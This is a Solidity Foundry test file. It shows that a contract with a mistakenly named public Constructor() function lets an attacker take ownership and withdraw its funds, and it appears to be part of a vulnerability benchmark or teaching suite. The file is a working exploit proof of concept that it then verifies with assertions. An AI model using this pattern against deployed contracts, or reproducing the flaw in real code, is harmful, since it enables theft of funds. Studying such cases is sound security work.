// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/incorrect_constructor_name3.sol";

contract MissingTest is Test {
    Missing public missing;
    address deployer = address(0x01);
    address attacker = address(0x02);
    
    function setUp() public {
        vm.deal(address(this), 10 ether);
        vm.startPrank(deployer);
        missing = new Missing();
        vm.stopPrank();
    }

    function testOwnerCanBeArbitrarilyChanged() public {
        console.log("--- BEFORE-Trigger Owner ---");
        // Set contract balance to test withdrawal ability
        vm.deal(address(missing), 1 wei);
        uint256 preContractBalance = address(missing).balance;
        uint256 preAttackerBalance = attacker.balance;

        // Pre-Condition: Attacker should not be able to withdraw
        vm.startPrank(attacker);
        (bool preSuccess, ) = address(missing).call(abi.encodeWithSignature("withdraw()"));
        vm.stopPrank();

        console.log("Attack possible before trigger?", preSuccess ? "YES (BUG)" : "NO (secure)");

        console.log("--- Trigger Constructor ---");
        // Attacker calls public Constructor() to change ownership
        vm.prank(attacker);
        missing.Constructor();

        console.log("--- AFTER-Trigger Owner ---");
        // Reset contract balance to test withdrawal ability
        vm.deal(address(missing), 1 wei);
        uint256 postContractBalance = address(missing).balance;
        uint256 postAttackerBalance = attacker.balance;

        // Post-Condition: Attacker should now be able to withdraw
        vm.startPrank(attacker);
        (bool postSuccess, ) = address(missing).call(abi.encodeWithSignature("withdraw()"));
        vm.stopPrank();

        uint256 newAttackerBalance = attacker.balance;
        uint256 stolenAmount = newAttackerBalance - postAttackerBalance;

        console.log("Attack possible after trigger?", postSuccess ? "YES" : "NO");
        console.log("Stolen wei amount:", stolenAmount);
        console.log("Contract balance after attack:", address(missing).balance);
        
        console.log("--- Vulnerability Verification ---");
        bool vulnerabilityExists = !preSuccess && postSuccess;
        console.log("Vulnerable state change occurred?", vulnerabilityExists ? "YES" : "NO");
        
        if (vulnerabilityExists) {
            // Verify consequences through fund theft
            vm.deal(address(missing), 1 ether);
            uint256 initialBalance = attacker.balance;
            
            vm.prank(attacker);
            missing.withdraw();
            
            assertTrue(attacker.balance > initialBalance, "Final theft failed");
            assertEq(address(missing).balance, 0, "Final funds not drained");
            console.log("Vulnerability Exists: Attacker became owner and stole funds");
        } else {
            console.log("Vulnerability not Exist: Ownership change not validated");
        }
    }
}